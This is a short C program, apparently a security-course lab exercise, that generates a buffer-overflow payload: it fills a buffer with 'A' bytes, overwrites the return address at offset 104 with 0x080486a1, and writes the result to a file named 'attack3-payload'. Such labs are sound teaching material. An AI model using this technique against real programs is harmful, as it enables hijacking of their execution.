#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately
	0x80486a1 */
	int buf_size=V3_SIZE+8;    
	char buffer[buf_size];
	memset(buffer,'A',buf_size);
	buffer[104]=0xa1;
	buffer[105]=0x86;
	buffer[106]=0x04;
	buffer[107]=0x08;
    write_to_file( "attack3-payload", buffer , buf_size , FILE_CLEAR );
    exit(0);
}
